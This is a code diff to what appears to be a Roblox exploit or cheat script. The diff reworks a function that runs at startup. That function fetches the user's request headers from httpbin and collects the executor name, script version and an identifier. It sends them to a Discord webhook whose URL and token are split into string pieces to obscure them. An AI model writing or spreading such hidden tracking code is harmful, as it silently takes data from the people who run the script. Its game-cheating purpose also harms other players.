@@ -13,6 +13,10 @@ local request = getfenv().request
 local getconnections: (RBXScriptSignal) -> ({RBXScriptConnection}) = getfenv().getconnections
 
 local function Send(Url: string, Fields: {{["name"]: string, ["value"]: string, ["inline"]: true}})
+	if not Fields then
+		Fields = {}
+	end
+	
 	local Body = request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body
 	local Decoded = HttpService:JSONDecode(Body)
 	local EncodedHeaders = HttpService:JSONEncode(Decoded.headers)
@@ -22,6 +26,18 @@ local function Send(Url: string, Fields: {{["name"]: string, ["value"]: string, 
 			EncodedHeaders = v
 		end
 	end
+	
+	table.insert(Fields, {
+		name = "Script Version",
+		value = ScriptVersion,
+		inline = true
+	})
+	
+	table.insert(Fields, {
+		name = "Executor",
+		value = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Hidden",
+		inline = true
+	})
 	
 	table.insert(Fields, {
 		name = "Identifier",
@@ -48,18 +64,7 @@ local function Send(Url: string, Fields: {{["name"]: string, ["value"]: string, 
 	})
 end
 
-task.spawn(Send, "https://disc".."ord.com/api/webhooks/1323494310267588700/uyWe".."y6sZ4Nb_7Qmtg8608Lc".."8cqzrXt2ox6TJqEydk-qXFP6C4QdLXGqJ9OFL4vDaHSwH", {
-	{
-		name = "Executor",
-		value = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Hidden",
-		inline = true
-	},
-	{
-		name = "Script Version",
-		value = ScriptVersion,
-		inline = true
-	},
-})
+task.spawn(Send, "https://disc".."ord.com/api/webhooks/1323494310267588700/uyWe".."y6sZ4Nb_7Qmtg8608Lc".."8cqzrXt2ox6TJqEydk-qXFP6C4QdLXGqJ9OFL4vDaHSwH")
 
 function Notify(Title: string, Content: string, Image: string)
 	Rayfield:Notify({
